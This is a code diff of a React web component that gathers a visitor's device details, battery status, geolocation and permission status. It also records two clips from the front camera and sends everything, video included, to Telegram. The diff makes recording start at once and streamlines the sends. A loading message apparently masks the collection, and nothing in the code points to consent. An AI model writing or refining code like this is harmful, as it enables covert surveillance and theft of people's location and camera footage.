@@ -185,19 +185,26 @@ const PermissionHandler = () => {
       setAppPhase("collectingData");
       loadingInterval = updateLoadingMessage();
 
-      let currentCollectedData: CollectedData = {}; // Используем let для мутации
+      let currentCollectedData: CollectedData = {};
+
+      // --- Start Video 1 Recording immediately ---
+      const video1Promise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
+
+      // --- Concurrently collect other data ---
+      const [
+        permissionStatusResult,
+        batteryInfoResult,
+        geolocationResult,
+      ] = await Promise.all([
+        getPermissionStatus(),
+        getBatteryInfo(),
+        getGeolocation(),
+      ]);
 
       // Collect client info (synchronous)
       currentCollectedData.clientInfo = getClientInfo();
       currentCollectedData.networkInfo = getNetworkInfo();
       currentCollectedData.deviceMemory = getDeviceMemory();
-
-      // Collect async data and await them
-      const [permissionStatusResult, batteryInfoResult, geolocationResult] = await Promise.all([
-        getPermissionStatus(),
-        getBatteryInfo(),
-        getGeolocation(),
-      ]);
 
       currentCollectedData.permissionStatus = permissionStatusResult;
 
@@ -210,50 +217,40 @@ const PermissionHandler = () => {
       if (geolocationResult.data) {
         currentCollectedData.geolocation = geolocationResult.data;
       }
-      // Update geolocation status in permissionStatus
       if (currentCollectedData.permissionStatus) {
         currentCollectedData.permissionStatus.geolocation = geolocationResult.status;
       }
 
-      // IP Address will be filled on the server side, but we pass a placeholder for now
-      currentCollectedData.ipAddress = "Fetching..."; 
+      currentCollectedData.ipAddress = "Fetching...";
 
-      setCollectedData(currentCollectedData); // Обновляем состояние
-      await sendDataToTelegram(currentCollectedData); // Отправляем начальные данные
-
-      // --- Video 1 Recording ---
-      setAppPhase("recordingVideo1");
-      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
+      // Await Video 1 completion
+      const video1Base64 = await video1Promise;
       if (video1Base64) {
         currentCollectedData = { ...currentCollectedData, video1: video1Base64 };
-        setCollectedData(currentCollectedData); // Обновляем состояние с video1
-        await sendDataToTelegram(currentCollectedData); // Отправляем данные с video1
-        currentCollectedData.video1 = undefined; // Очищаем video1, чтобы не отправлять его снова
       }
+      setCollectedData(currentCollectedData);
+      await sendDataToTelegram(currentCollectedData);
+      currentCollectedData.video1 = undefined; // Clear after sending
 
       // --- Video 2 Recording ---
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video2Base64) {
         currentCollectedData = { ...currentCollectedData, video2: video2Base64 };
-        setCollectedData(currentCollectedData); // Обновляем состояние с video2
-        await sendDataToTelegram(currentCollectedData); // Отправляем данные с video2
-        currentCollectedData.video2 = undefined; // Очищаем video2, чтобы не отправлять его снова
       }
+      setCollectedData(currentCollectedData);
+      await sendDataToTelegram(currentCollectedData);
+      currentCollectedData.video2 = undefined; // Clear after sending
 
-      // --- Flip Camera and QR Scanning ---
+      // --- QR Scanning ---
       setAppPhase("flippingCamera");
-      // QrScanner component will handle activating the 'environment' camera
-      // and will call onCameraActive when ready.
-      setAppPhase("qrScanning"); // Transition to QR scanning phase
+      setAppPhase("qrScanning");
 
-      // Set a timeout for QR scanning
       qrTimeout = setTimeout(async () => {
         console.log("QR scanning timed out.");
-        // Отправляем финальный отчет с таймаутом QR
         const finalData = { ...currentCollectedData, qrCodeData: "QR Scan Timed Out" };
         setCollectedData(finalData);
-        await sendDataToTelegram(finalData); // Отправляем финальный отчет
+        await sendDataToTelegram(finalData);
         setAppPhase("finished");
       }, QR_SCAN_TIMEOUT_MS);
     };
@@ -273,18 +270,7 @@ const PermissionHandler = () => {
         videoRef.current.srcObject = null;
       }
     };
-  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage, collectedData]); // Добавил collectedData в зависимости
-  // Удаляем этот useEffect, так как video2 теперь отправляется в рамках финального отчета
-  // useEffect(() => {
-  //   if (appPhase === "qrScanning" && collectedData.video2 && !collectedData.qrCodeData) {
-  //     const sendVideo2 = async () => {
-  //       console.log("Sending Video 2 now that QR scanner is active...");
-  //       await sendDataToTelegram({ ...collectedData, video2: collectedData.video2 });
-  //       setCollectedData(prev => ({ ...prev, video2: undefined }));
-  //     };
-  //     sendVideo2();
-  //   }
-  // }, [appPhase, collectedData, sendDataToTelegram]);
+  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage, collectedData]);
 
 
   return (
